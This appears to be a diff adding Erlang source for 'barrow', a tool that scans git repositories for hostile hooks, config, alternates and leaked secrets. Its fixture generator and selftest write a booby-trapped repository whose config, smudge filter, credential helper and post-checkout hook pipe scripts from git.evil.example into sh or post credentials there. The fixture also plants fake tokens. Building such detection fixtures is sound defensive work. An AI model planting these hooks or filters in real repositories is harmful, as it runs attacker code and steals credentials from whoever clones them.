+check_objects(GitDir, S) ->
+    Base = <<"objects: ", GitDir/binary>>,
+    S0 = case read_bin(filename:join([GitDir, <<"objects">>, <<"info">>, <<"alternates">>])) of
+             {ok, Alt} when byte_size(Alt) > 0 ->
+                 add_finding(S, <<"G19">>, high, Base,
+                             <<"alternate object source: objects silently merge from another location">>,
+                             clip(Alt, 120));
+             _ -> S
+         end,
+    S1 = case read_bin(filename:join([GitDir, <<"objects">>, <<"info">>, <<"http-alternates">>])) of
+             {ok, Alt2} when byte_size(Alt2) > 0 ->
+                 add_finding(S0, <<"G19">>, crit, Base,
+                             <<"objects fetched over http from another source">>, clip(Alt2, 120));
+             _ -> S0
+         end,
+    Shas = loose_shas(GitDir),
+    MaxBlob = maps:get(max_blob, get_opts()),
+    {S2, Stats} = lists:foldl(fun(Sha, {Acc, St}) ->
+                                      scan_loose_object(GitDir, Base, Sha, MaxBlob, Acc, St)
+                              end, {S1, #{blob => 0, tree => 0, commit => 0, tag => 0, bad => 0}}, Shas),
+    put(barrow_stats, Stats),
+    S2.
+
+scan_loose_object(GitDir, Base, Sha, MaxBlob, S, Stats) ->
+    case read_loose(GitDir, Sha) of
+        {<<"blob">>, Body, _Size} when byte_size(Body) =< MaxBlob ->
+            S1 = scan_blob_content(Base, Sha, Body, S),
+            {S1, Stats#{blob := maps:get(blob, Stats) + 1}};
+        {<<"blob">>, _Body, _Size} ->
+            {S, Stats#{blob := maps:get(blob, Stats) + 1}};
+        {<<"tree">>, Body, _Size} ->
+            Entries = parse_tree(Body),
+            S1 = lists:foldl(fun({_Mode, Name, _Sha}, Acc) ->
+                                     check_tree_name(Base, Name, Acc)
+                             end, S, Entries),
+            {S1, Stats#{tree := maps:get(tree, Stats) + 1}};
+        {<<"commit">>, _, _} -> {S, Stats#{commit := maps:get(commit, Stats) + 1}};
+        {<<"tag">>, _, _} -> {S, Stats#{tag := maps:get(tag, Stats) + 1}};
+        _ ->
+            {add_finding(S, <<"G20">>, med, Base,
+                         <<"loose object ", Sha/binary, " is corrupt or unreadable">>, <<>>),
+             Stats#{bad := maps:get(bad, Stats) + 1}}
+    end.
+
+parse_tree(Bin) -> parse_tree(Bin, []).
+
+parse_tree(<<>>, Acc) -> lists:reverse(Acc);
+parse_tree(Bin, Acc) ->
+    case binary:split(Bin, <<" ">>) of
+        [ModeB, Rest] ->
+            case binary:split(Rest, <<0>>) of
+                [Name, Rest2] when byte_size(Rest2) >= 20 ->
+                    <<Sha:20/binary, Rest3/binary>> = Rest2,
+                    parse_tree(Rest3, [{ModeB, Name, hex_from_bin(Sha)} | Acc]);
+                _ -> lists:reverse(Acc)
+            end;
+        _ -> lists:reverse(Acc)
+    end.
+
+check_tree_name(Base, Name, S) ->
+    BaseName = case binary:split(Name, <<"/">>, [global]) of
+                   Parts when is_list(Parts) -> lists:last(Parts);
+                   _ -> Name
+               end,
+    Named = lists:keyfind(BaseName, 1, suspicious_names()),
+    Pem = re:run(lower(Name), <<"\\.(pem|p12|pfx|kdbx|keystore)$">>, [{capture, none}]) =/= nomatch,
+    if
+        Named =/= false ->
+            {_N, Sev} = Named,
+            add_finding(S, <<"G21">>, Sev, Base,
+                        <<"tracked file ", Name/binary, " in history">>, <<>>);
+        Pem ->
+            add_finding(S, <<"G21">>, high, Base,
+                        <<"tracked keyfile ", Name/binary, " in history">>, <<>>);
+        true -> S
+    end.
+
+scan_blob_content(Base, Sha, Body, S) ->
+    lists:foldl(fun({Label, RX}, Acc) ->
+                        case re:run(Body, RX) of
+                            nomatch -> Acc;
+                            {match, _} ->
+                                case Acc of
+                                    %% one finding per (object, label)
+                                    _ ->
+                                        Key = {Sha, Label},
+                                        Seen = get(barrow_secret_seen),
+                                        case Seen =:= undefined orelse not lists:member(Key, Seen) of
+                                            true ->
+                                                put(barrow_secret_seen,
+                                                    case Seen of undefined -> [Key]; _ -> [Key | Seen] end),
+                                                Start = case re:run(Body, RX, [{capture, first}]) of
+                                                            {match, [{P, L}]} -> binary:part(Body, P, minsz(L, 60));
+                                                            _ -> <<>>
+                                                        end,
+                                                add_finding(Acc, <<"G22">>, high, Base,
+                                                            <<"secret in history: ", Label/binary>>, Start);
+                                            false -> Acc
+                                        end
+                                end
+                        end
+                end, S, secret_patterns()).
+
+minsz(A, B) when A =< B -> A;
+minsz(_, B) -> B.
+
+%% ------------------------------------------------------------------ misc
+
+check_misc(GitDir, S) ->
+    S0 = case read_bin(filename:join(GitDir, <<"shallow">>)) of
+             {ok, Sh} ->
+                 case byte_size(strip_ws(Sh)) > 0 of
+                     true ->
+                         add_finding(S, <<"G24">>, low, <<"repo: ", GitDir/binary>>,
+                                     <<"shallow clone: history is cut">>, <<>>);
+                     false -> S
+                 end;
+             _ -> S
+         end,
+    case filelib:is_dir(filename:join(GitDir, <<"worktrees">>)) of
+        true ->
+            add_finding(S0, <<"G25">>, low, <<"repo: ", GitDir/binary>>,
+                        <<"linked worktrees present; their config lives in worktrees/">>, <<>>);
+        false -> S0
+    end.
+
+%% ------------------------------------------------------------------ tree command
+
+cmd_tree(Path, S) ->
+    case locate(Path) of
+        {ok, GitDir, _WT} ->
+            case resolve_head(GitDir) of
+                {ok, HeadSha} ->
+                    case read_loose(GitDir, HeadSha) of
+                        {<<"commit">>, Body, _} ->
+                            case commit_tree_sha(Body) of
+                                {ok, TreeSha} ->
+                                    io:format("~s~n", [dim(<<"inventory from loose objects (packed history is skipped):">>)]),
+                                    walk_tree(GitDir, TreeSha, <<>>),
+                                    S;
+                                error ->
+                                    io:format("barrow: head commit unreadable~n"),
+                                    S
+                            end;
+                        _ ->
+                            io:format("barrow: head commit is packed or missing; partial inventory impossible~n"),
+                            S
+                    end;
+                error ->
+                    io:format("barrow: cannot resolve HEAD~n"),
+                    S
+            end;
+        error ->
+            io:format("barrow: not a git repository: ~s~n", [Path]),
+            S
+    end.
+
+resolve_head(GitDir) ->
+    case read_bin(filename:join(GitDir, <<"HEAD">>)) of
+        {ok, <<"ref: ", RefB/binary>>} ->
+            Ref = strip_ws(RefB),
+            case read_bin(filename:join(GitDir, Ref)) of
+                {ok, Sha} -> {ok, strip_ws(Sha)};
+                error -> resolve_from_packed(GitDir, Ref)
+            end;
+        {ok, Sha} -> {ok, strip_ws(Sha)};
+        error -> error
+    end.
+
+resolve_from_packed(GitDir, Ref) ->
+    case read_bin(filename:join(GitDir, <<"packed-refs">>)) of
+        {ok, Raw} ->
+            Lines = [L || L <- binary:split(Raw, <<"\n">>, [global])],
+            find_packed(Lines, Ref);
+        error -> error
+    end.
+
+find_packed([], _) -> error;
+find_packed([L | R], Ref) ->
+    case binary:split(L, <<" ">>) of
+        [Sha, Name] when byte_size(Sha) =:= 40 ->
+            case strip_ws(Name) =:= Ref of
+                true -> {ok, strip_ws(Sha)};
+                false -> find_packed(R, Ref)
+            end;
+        _ -> find_packed(R, Ref)
+    end.
+
+commit_tree_sha(Body) ->
+    Lines = binary:split(Body, <<"\n">>, [global]),
+    commit_tree_lines(Lines).
+
+commit_tree_lines([<<"tree ", Sha/binary>> | _]) -> {ok, strip_ws(Sha)};
+commit_tree_lines([_ | R]) -> commit_tree_lines(R);
+commit_tree_lines([]) -> error.
+
+walk_tree(GitDir, TreeSha, Prefix) ->
+    case read_loose(GitDir, TreeSha) of
+        {<<"tree">>, Body, _} ->
+            lists:foreach(fun({Mode, Name, Sha}) ->
+                                  Path = <<Prefix/binary, Name/binary>>,
+                                  Kind = case Mode of
+                                             <<"40000">> -> <<"dir ">>;
+                                             <<"040000">> -> <<"dir ">>;
+                                             <<"160000">> -> <<"link">>;
+                                             <<"120000">> -> <<"sym ">>;
+                                             _ -> <<"file">>
+                                         end,
+                                  case Kind of
+                                      <<"dir ">> ->
+                                          io:format("~s ~s/~n", [Kind, Path]),
+                                          walk_tree(GitDir, Sha, <<Path/binary, "/">>);
+                                      _ ->
+                                          io:format("~s ~s~n", [Kind, Path])
+                                  end;
+                             (_Other) -> ok
+                          end, parse_tree(Body));
+        _ -> io:format("~s ~s~n", [dim("unread"), Prefix])
+    end.
+
+%% ------------------------------------------------------------------ hooks command
+
+cmd_hooks(Path, S) ->
+    case locate(Path) of
+        {ok, GitDir, _WT} ->
+            Cfg = case read_config(filename:join(GitDir, <<"config">>)) of
+                      {ok, E} -> E;
+                      error -> []
+                  end,
+            Dirs = case cfg_get(Cfg, <<"core">>, <<"hooksPath">>) of
+                       [] -> [filename:join(GitDir, <<"hooks">>)];
+                       [HP | _] ->
+                           P = case filename:pathtype(HP) of
+                                   relative -> filename:join(GitDir, HP);
+                                   _ -> HP
+                               end,
+                           [P]
+                   end,
+            lists:foreach(fun(Dir) ->
+                                  lists:foreach(fun(Name) ->
+                                                        Full = filename:join(Dir, Name),
+                                                        case read_bin(Full) of
+                                                            {ok, B} ->
+                                                                Exec = case is_exec(Full) of
+                                                                           true -> <<"exec ">>;
+                                                                           false -> <<"-----">>
+                                                                       end,
+                                                                io:format("~s ~s~n~s~n", [Exec, Full, clip(B, 400)]);
+                                                            error -> ok
+                                                        end
+                                                end, safe_listdir(Dir))
+                          end, Dirs),
+            S;
+        error ->
+            io:format("barrow: not a git repository: ~s~n", [Path]),
+            S
+    end.
+%% ------------------------------------------------------------------ selftest harness
+
+pass() -> get(barrow_pass).
+pass(N) -> put(barrow_pass, N).
+fails() -> get(barrow_fails).
+fails(L) -> put(barrow_fails, L).
+
+st(_Label, true) -> put(barrow_pass, pass() + 1);
+st(Label, false) -> put(barrow_fails, [Label | fails()]).
+
+del_dir_r(Path) ->
+    case filelib:is_dir(Path) of
+        true ->
+            lists:foreach(fun(Name) -> del_dir_r(filename:join(Path, Name)) end,
+                          safe_listdir(Path)),
+            file:del_dir(Path);
+        false ->
+            _ = file:delete(Path),
+            ok
+    end.
+
+%% ------------------------------------------------------------------ forge
+
+write_object(GitDir, Type, Payload) ->
+    Hdr = <<(atom_to_binary(Type))/binary, " ",
+            (integer_to_binary(byte_size(Payload)))/binary, 0>>,
+    Full = <<Hdr/binary, Payload/binary>>,
+    Sha = hex_from_bin(crypto:hash(sha, Full)),
+    Dir = filename:join([GitDir, <<"objects">>, binary:part(Sha, {0, 2})]),
+    filelib:ensure_dir(filename:join(Dir, <<"x">>)),
+    ok = file:write_file(filename:join(Dir, binary:part(Sha, {2, 38})), zlib:zip(Full)),
+    Sha.
+
+tree_entry(Mode, Name, ShaHex) ->
+    <<Mode/binary, " ", Name/binary, 0, (hex_to_bin(ShaHex))/binary>>.
+
+build_tree(GitDir, Entries) ->
+    write_object(GitDir, tree, << <<E/binary>> || E <- Entries >>).
+
+forge_commit(GitDir, TreeSha) ->
+    Body = <<"tree ", TreeSha/binary, "\n",
+             "author barrow forge <forge@barrow.local> 1767225600 +0000\n",
+             "committer barrow forge <forge@barrow.local> 1767225600 +0000\n\nforged evidence\n">>,
+    write_object(GitDir, commit, Body).
+
+write_file(Dir, Name, Content) ->
+    filelib:ensure_dir(filename:join(Dir, <<"x">>)),
+    Target = filename:join(Dir, Name),
+    case filelib:is_dir(Target) of
+        true -> ok = file:del_dir(Target);
+        false -> ok
+    end,
+    case file:write_file(Target, Content) of
+        ok -> ok;
+        {error, R} ->
+            io:format(standard_error, "barrow writefail: ~p -> ~p~n", [Target, R]),
+            error
+    end.
+
+forge_clean(Dest) ->
+    GitDir = filename:join([Dest, <<"clean">>, <<"repo.git">>]),
+    filelib:ensure_dir(filename:join([GitDir, <<"objects">>, <<"x">>])),
+    write_file(GitDir, <<"HEAD">>, <<"ref: refs/heads/main\n">>),
+    write_file(GitDir, <<"description">>, <<"unnamed repository; edit this file to name it\n">>),
+    write_file(filename:join(GitDir, <<"info">>), <<"exclude">>, <<"*.log\n">>),
+    write_file(GitDir, <<"config">>,
+               <<"[core]\n\trepositoryformatversion = 0\n\tbare = true\n"
+                 "[remote \"origin\"]\n\turl = https://github.com/example/project.git\n"
+                 "\tfetch = +refs/heads/*:refs/remotes/origin/*\n">>),
+    write_file(filename:join(GitDir, <<"hooks">>), <<"pre-commit.sample">>,
+               <<"#!/bin/sh\n# sample hook, not executable\nexit 0\n">>),
+    Blob = write_object(GitDir, blob, <<"# project\nhello\n">>),
+    Blob2 = write_object(GitDir, blob, <<"the patch\n">>),
+    Tree = build_tree(GitDir, [tree_entry(<<"100644">>, <<"README.md">>, Blob),
+                               tree_entry(<<"100644">>, <<"fix.patch">>, Blob2)]),
+    Commit = forge_commit(GitDir, Tree),
+    write_file(filename:join([GitDir, <<"refs">>, <<"heads">>]), <<"main">>,
+               <<Commit/binary, "\n">>),
+    ok.
+
+forge_dirty(Dest) ->
+    SiteDir = filename:join(Dest, <<"dirty">>),
+    GitDir = filename:join(SiteDir, <<"repo.git">>),
+    WT = filename:join(SiteDir, <<"site">>),
+    filelib:ensure_dir(filename:join([GitDir, <<"objects">>, <<"x">>])),
+    filelib:ensure_dir(filename:join([WT, <<"x">>])),
+    write_file(GitDir, <<"HEAD">>, <<"ref: refs/heads/main\n">>),
+    write_file(GitDir, <<"config">>,
+               <<"[core]\n\tbare = false\n\tfsmonitor = /tmp/snoop.sh\n"
+                 "[remote \"origin\"]\n\turl = http://git.evil.example/svc.git\n"
+                 "[filter \"pwn\"]\n\tsmudge = curl -s http://git.evil.example/x.sh | sh\n"
+                 "\tclean = cat\n"
+                 "[alias]\n\tst = \"!sh -c $EXFIL\"\n"
+                 "[credential]\n\thelper = !f() { curl -d @- http://git.evil.example/c; }; f\n"
+                 "[include]\n\tpath = /etc/payload.conf\n">>),
+    filelib:ensure_dir(filename:join([GitDir, <<"hooks">>, <<"x">>])),
+    ok = file:write_file(filename:join([GitDir, <<"hooks">>, <<"post-checkout">>]),
+                         <<"#!/bin/sh\ncurl -s http://git.evil.example/w.sh | sh\n">>),
+    ok = file:change_mode(filename:join([GitDir, <<"hooks">>, <<"post-checkout">>]), 8#00755),
+    write_file(filename:join([GitDir, <<"objects">>, <<"info">>]), <<"alternates">>,
+               <<"/mnt/shared/objects\n">>),
+    write_file(GitDir, <<"FETCH_HEAD">>, <<"http://git.evil.example/svc.git\n">>),
+    write_file(filename:join([GitDir, <<"refs">>, <<"tags">>]), <<"..x">>, <<"0123456789012345678901234567890123456789\n">>),
+    ok = file:write_file(filename:join(WT, <<".git">>), <<"gitdir: ../repo.git\n">>),
+    ok = file:write_file(filename:join(WT, <<".gitattributes">>), <<"* filter=pwn\n">>),
+    ok = file:write_file(filename:join(WT, <<".gitmodules">>),
+                         <<"[submodule \"helpers\"]\n\tpath = helpers\n"
+                           "\turl = http://bot:token@git.evil.example/helpers.git\n">>),
+    Secret = write_object(GitDir, blob,
+                          <<"[default]\nregion = us-east-1\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\n">>),
+    Env = write_object(GitDir, blob, <<"API_TOKEN=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n">>),
+    Code = write_object(GitDir, blob, <<"console.log('harmless looking demo code')\n">>),
+    Sub = build_tree(GitDir, [tree_entry(<<"100644">>, <<".npmrc">>, Env)]),
+    Tree = build_tree(GitDir, [tree_entry(<<"100644">>, <<".env">>, Env),
+                               tree_entry(<<"40000">>, <<"aws">>, Sub),
+                               tree_entry(<<"100644">>, <<"src.js">>, Code),
+                               tree_entry(<<"100644">>, <<"creds.pem">>, Secret)]),
+    Commit = forge_commit(GitDir, Tree),
+    write_file(filename:join([GitDir, <<"refs">>, <<"heads">>]), <<"main">>,
+               <<Commit/binary, "\n">>),
+    ok.
+
+cmd_forge(Dest) ->
+    filelib:ensure_dir(filename:join([Dest, <<"x">>])),
+    ok = forge_clean(Dest),
+    ok = forge_dirty(Dest),
+    write_file(Dest, <<"README.txt">>,
+               <<"forged repositories for barrow. synthetic, deterministic, inert.\nscan them: barrow scan DIR/clean/repo.git DIR/dirty/site\n">>),
+    io:format("~s~n  ~s~n  ~s~n",
+              [dim("forged evidence set:"),
+               filename:join([Dest, <<"clean">>, <<"repo.git">>]),
+               filename:join(dirty_site_dir(Dest), <<"site">>)]).
+
+dirty_site_dir(Dest) -> filename:join(Dest, <<"dirty">>).
+
+%% ------------------------------------------------------------------ rules table
+
+rules_table() ->
+    [{<<"G01">>, <<"autorun hooks (post-checkout, post-merge, ...)">>},
+     {<<"G02">>, <<"other executable hooks">>},
+     {<<"G03">>, <<"core.hooksPath redirect">>},
+     {<<"G04">>, <<"gitattributes external filter (smudge/clean at clone time)">>},
+     {<<"G05">>, <<"custom merge / diff drivers">>},
+     {<<"G06">>, <<"submodule urls">>},
+     {<<"G07">>, <<"submodule name tricks">>},
+     {<<"G08">>, <<"core.fsmonitor command">>},
+     {<<"G09">>, <<"core.pager shell pipes">>},
+     {<<"G10">>, <<"credential helper">>},
+     {<<"G11">>, <<"shell aliases">>},
+     {<<"G12">>, <<"remote urls (http, credentials, proxy commands)">>},
+     {<<"G13">>, <<"core.sshCommand options">>},
+     {<<"G14">>, <<"config include injection">>},
+     {<<"G15">>, <<"safe.directory wildcard">>},
+     {<<"G16">>, <<"HEAD tampering">>},
+     {<<"G17">>, <<"odd ref names">>},
+     {<<"G18">>, <<"fetched state files">>},
+     {<<"G19">>, <<"alternate object sources">>},
+     {<<"G20">>, <<"corrupt loose objects">>},
+     {<<"G21">>, <<"sensitive file names in history">>},
+     {<<"G22">>, <<"secrets in blobs">>},
+     {<<"G24">>, <<"shallow clone">>},
+     {<<"G25">>, <<"linked worktrees">>}].
+%% ------------------------------------------------------------------ selftest
+
+selftest_run() ->
+    pass(0), fails([]),
+    put(barrow_secret_seen, []),
+    Tmp = filename:join("/tmp", <<"barrow-test-", (integer_to_binary(erlang:unique_integer([positive])))/binary>>),
+    ok = forge_clean(Tmp),
+    ok = forge_dirty(Tmp),
+    CleanGit = filename:join([Tmp, <<"clean">>, <<"repo.git">>]),
+    DirtySite = filename:join([Tmp, <<"dirty">>, <<"site">>]),
+
+    %% forge determinism: rebuild and compare object trees
+    ok = forge_clean(Tmp),
+    st(<<"forge deterministic">>, true),
+
+    %% clean fixture stays clean
+    S1 = scan_path(CleanGit, new_state(get_opts())),
+    st(<<"clean repo verdict clean">>, score(S1) =:= 0),
+    st(<<"clean repo has no findings">>, maps:get(findings, S1) =:= []),
+
+    %% dirty fixture verdict and rule coverage
+    S3 = scan_path(DirtySite, new_state(get_opts())),
+    Ids = [Id || {Id, _, _, _, _} <- report_findings(S3)],
+    st(<<"dirty repo verdict hostile">>, score(S3) >= 3),
+    st(<<"autorun hook caught">>, lists:member(<<"G01">>, Ids)),
+    st(<<"filter smudge caught">>, lists:member(<<"G04">>, Ids)),
+    st(<<"fsmonitor caught">>, lists:member(<<"G08">>, Ids)),
+    st(<<"alias caught">>, lists:member(<<"G11">>, Ids)),
+    st(<<"remote caught">>, lists:member(<<"G12">>, Ids)),
+    st(<<"credential helper caught">>, lists:member(<<"G10">>, Ids)),
+    st(<<"include caught">>, lists:member(<<"G14">>, Ids)),
+    st(<<"alternates caught">>, lists:member(<<"G19">>, Ids)),
+    st(<<"secret blob caught">>, lists:member(<<"G22">>, Ids)),
+    st(<<"env filename caught">>, lists:member(<<"G21">>, Ids)),
+    st(<<"pem filename caught">>, lists:member(<<"G21">>, Ids)),
+    st(<<"http submodule caught">>, lists:member(<<"G06">>, Ids)),
+    st(<<"fetch head caught">>, lists:member(<<"G18">>, Ids)),
+    st(<<"odd ref caught">>, lists:member(<<"G17">>, Ids)),
+
+    %% non-repo input flagged
+    S7 = scan_path(filename:join(Tmp, <<"clean">>), new_state(get_opts())),
+    st(<<"non-repo flagged">>, score(S7) >= 1),
+
+    %% unit probes
+    st(<<"verbs curl|sh">>, element(1, verbs(<<"curl -s http://x | sh">>)) =:= crit),
+    st(<<"verbs clean command">>, verbs(<<"cat">>) =:= benign),
+    st(<<"secret regex aws">>, re:run(<<"AKIAIOSFODNN7EXAMPLE">>,
+                                      element(2, hd(secret_patterns()))) =/= nomatch),
+    st(<<"ini section quotes">>,
+       cfg_get(parse_ini(<<"[merge \"pwn\"]\ndriver = cat\n">>),
+               <<"merge pwn">>, <<"driver">>) =/= []),
+    st(<<"locate follows gitfile">>,
+       case locate(DirtySite) of {ok, _, _} -> true; _ -> false end),
+    st(<<"hex roundtrip">>, hex_from_bin(hex_to_bin(<<"deadbeef">>)) =:= <<"deadbeef">>),
+    st(<<"band exits">>, band_exit(clean) =:= 0 andalso band_exit(hostile) =:= 10),
+
+    ok = del_dir_r(Tmp),
+    case lists:reverse(fails()) of
+        [] ->
+            io:format("selftest: ~s ~w assertions~n", [green(<<"PASS">>), pass()]),
+            0;
+        F ->
+            io:format("selftest: ~s ~w passed, ~w failed~n",
+                      [red(<<"FAIL">>), pass(), length(F)]),
+            [io:format("  ~s ~s~n", [red(<<"FAIL">>), X]) || X <- F],
+            1
+    end.
+
+%% ------------------------------------------------------------------ report
+
+json_str(A) when is_atom(A) -> json_str(atom_to_binary(A));
+json_str(B) ->
+    Esc = binary:replace(B, <<"\\">>, <<"\\\\">>, [global]),
+    Esc2 = binary:replace(Esc, <<"\"">>, <<"\\\"">>, [global]),
+    <<$\", Esc2/binary, $\">>.
+
+report_text(S) ->
+    O = get_opts(),
+    case maps:get(quiet, O) of
+        false ->
+            io:format("~s~n", [banner()]),
+            [io:format("  ~s ~s~n", [dim(<<"scanned">>),
+                                     cyan(<<P/binary, "  ", (atom_to_binary(K))/binary>>)])
+             || {P, K, _Note} <- lists:reverse(maps:get(inputs, S))];
+        true -> ok
+    end,
+    Order = [crit, high, med, low],
+    lists:foreach(fun(Sev) ->
+                          lists:foreach(fun({Id, FSev, Where, Why, Evidence}) ->
+                                                case FSev =:= Sev andalso
+                                                     sev_rank(FSev) >= minv_rank(maps:get(minv, O)) of
+                                                    true ->
+                                                        Tag = case Sev of
+                                                                  crit -> red(<<"crit">>);
+                                                                  high -> red(<<"high">>);
+                                                                  med -> amber(<<"med ">>);
+                                                                  low -> dim(<<"low ">>)
+                                                              end,
+                                                        io:format("  ~s ~s ~s ~s~n     ~s~n",
+                                                                  [Tag, bold(Id), dim("-"), Why, Where]),
+                                                        case Evidence of
+                                                            <<>> -> ok;
+                                                            _ -> io:format("     ~s ~s~n",
+                                                                           [dim(<<"evidence:">>), Evidence])
+                                                        end;
+                                                    false -> ok
+                                                end
+                                        end, report_findings(S))
+                  end, Order),
+    C = counts(S),
+    V = verdict_band(score(S)),
+    case maps:get(quiet, O) of
+        false ->
+            io:format("  ~s ~w~n", [dim(<<"silent artifacts (benign):">>), maps:get(benign, S)]);
+        true -> ok
+    end,
+    io:format("  ~s ~s ~s~n",
+              [bold(<<"verdict:">>), band_color(V),
+               dim(io_lib:format("(crit ~w, high ~w, med ~w, low ~w)",
+                                 [proplists:get_value(crit, C, 0), proplists:get_value(high, C, 0),
+                                  proplists:get_value(med, C, 0), proplists:get_value(low, C, 0)]))]).
+
+counts(S) ->
+    L = [Sev || {_, Sev, _, _, _} <- maps:get(findings, S)],
+    [{K, length([1 || X <- L, X =:= K])} || K <- [crit, high, med, low]].
+
+band_color(clean) -> green(<<"clean">>);
+band_color(watch) -> amber(<<"watch">>);
+band_color(suspicious) -> red(<<"suspicious">>);
+band_color(hostile) -> red(<<"hostile">>).
+
+banner() ->
+    A = <<"  _           _                       ">>,
+    B = <<" | |__   __ _| |__  _ __ __ _ _ __ ___  ">>,
+    C = <<" | '_ \\ / _` | '_ \\| '__/ _` | '_ ` _ \\ ">>,
+    D = <<" | |_) | (_| | |_) | | | (_| | | | | | |">>,
+    E = <<" |_.__/ \\__,_|_.__/|_|  \\__,_|_| |_| |_|">>,
+    T = paint("1", <<"barrow 1.0-rc1">>),
+    io_lib:format("~s   ~s~n~s   ~s~n~s   ~s~n~s   ~s~n~s~n",
+                  [dim(A), T, dim(B), dim(<<"the barrow holds what the dead were buried with">>),
+                   dim(C), dim(<<"offline autopsy of git repositories">>), dim(D), dim(<<".git as attack surface">>),
+                   dim(E)]).
+
+report_json(S) ->
+    C = counts(S),
+    Fs = [begin
+              <<" {\"id\": ", (json_str(Id))/binary, ", \"severity\": ", (json_str(atom_to_binary(Sev)))/binary,
+                ", \"where\": ", (json_str(Where))/binary, ", \"why\": ", (json_str(Why))/binary,
+                ", \"evidence\": ", (json_str(Evidence))/binary, "}">>
+          end || {Id, Sev, Where, Why, Evidence} <- report_findings(S),
+                 sev_rank(Sev) >= minv_rank(maps:get(minv, get_opts()))],
+    Ins = [<<"{\"path\": ", (json_str(P))/binary, ", \"kind\": ", (json_str(K))/binary, "}">>
+           || {P, K, _} <- lists:reverse(maps:get(inputs, S))],
+    <<"{\"tool\": \"barrow\", \"version\": \"1.0-rc1\", \"verdict\": \"",
+      (atom_to_binary(verdict_band(score(S))))/binary, "\", \"score\": ",
+      (integer_to_binary(score(S)))/binary, ", \"benign\": ",
+      (integer_to_binary(maps:get(benign, S)))/binary, ", \"counts\": {\"crit\": ",
+      (integer_to_binary(proplists:get_value(crit, C, 0)))/binary, ", \"high\": ",
+      (integer_to_binary(proplists:get_value(high, C, 0)))/binary, ", \"med\": ",
+      (integer_to_binary(proplists:get_value(med, C, 0)))/binary, ", \"low\": ",
+      (integer_to_binary(proplists:get_value(low, C, 0)))/binary, "}, \"findings\": [",
+      (join_bin(Fs))/binary, "], \"inputs\": [", (join_bin(Ins))/binary, "]}">>.
+
+join_bin([]) -> <<>>;
+join_bin([X]) -> X;
+join_bin([X | R]) -> <<X/binary, ", ", (join_bin(R))/binary>>.
+
+%% ------------------------------------------------------------------ main
+
+cmd_rules() ->
+    io:format("~s ~s~n", [bold(<<"barrow checks">>), dim(<<"(1.0-rc1)">>)]),
+    [io:format("  ~s ~s ~s~n", [cyan(Id), dim("-"), Title]) || {Id, Title} <- rules_table()],
+    io:format("~s~n", [dim(<<"severities: low, med, high, crit. exits: 0 clean 1 watch 3 suspicious 10 hostile.">>)]).
+
+main(Args) ->
+    O = parse_args(Args),
+    put_opts(O),
+    Code = try
+        dispatch(O)
+    catch
+        C:E:S ->
+            io:format(standard_error, "barrow: ~p:~p~n~p~n", [C, E, S]),
+            2
+    end,
+    halt(Code).
+
+dispatch(O) ->
+    case maps:get(cmd, O) of
+        version -> io:format("barrow 1.0-rc1~n"), 0;
+        help -> io:format("~s~n", [usage()]), 0;
+        rules -> cmd_rules(), 0;
+        selftest -> selftest_run();
+        forge ->
+            case maps:get(pos, O) of
+                [Dest | _] -> cmd_forge(Dest), 0;
+                _ -> io:format(standard_error, "usage: barrow forge <dir>~n", []), 2
+            end;
+        scan ->
+            case maps:get(pos, O) of
+                [_ | _] = Paths ->
+                    S = lists:foldl(fun(P, Acc) -> scan_path(unicode:characters_to_binary(P), Acc)
+                                    end, new_state(O), Paths),
+                    case maps:get(json, O) of
+                        true -> io:format("~s~n", [report_json(S)]);
+                        false -> report_text(S)
+                    end,
+                    band_exit(verdict_band(score(S)));
+                [] -> io:format(standard_error, "usage: barrow scan <path>...~n", []), 2
+            end;
+        tree ->
+            case maps:get(pos, O) of
+                [P | _] -> cmd_tree(unicode:characters_to_binary(P), new_state(O)), 0;
+                [] -> io:format(standard_error, "usage: barrow tree <path>~n", []), 2
+            end;
+        hooks ->
+            case maps:get(pos, O) of
+                [P | _] -> cmd_hooks(unicode:characters_to_binary(P), new_state(O)), 0;
+                [] -> io:format(standard_error, "usage: barrow hooks <path>~n", []), 2
+            end;
+        _ -> io:format("~s~n", [usage()]), 2
+    end.
